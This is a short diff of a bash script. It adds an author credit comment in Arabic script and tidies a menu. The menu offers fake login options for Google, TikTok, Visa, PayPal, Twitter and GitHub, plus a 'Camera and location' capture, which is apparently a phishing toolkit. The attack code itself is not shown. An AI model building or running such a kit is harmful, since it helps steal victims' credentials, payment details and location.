@@ -1,5 +1,5 @@
 #!/bin/bash
-
+#By: آلقيـــــــــــــــآدهہ‌‏ آلزعيـــم
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
@@ -1173,8 +1173,7 @@ show_menu() {
     echo -e "${BLUE}[3] Google login..🌐${NC}"
     echo -e "${BLUE}[4] TikTok login..🌐${NC}"
     echo -e "${BLUE}[5] Visa login..🌐${NC}"
-    echo -e "${BLUE}[6] Camera and location.. 
-    📸${NC}"
+    echo -e "${BLUE}[6] Camera and location..📸${NC}"
     echo -e "${BLUE}[7] Twitter login..🌐${NC}"
     echo -e "${BLUE}[8] PayPal login..🌐${NC}"
     echo -e "${BLUE}[9] GitHub login..🌐${NC}"
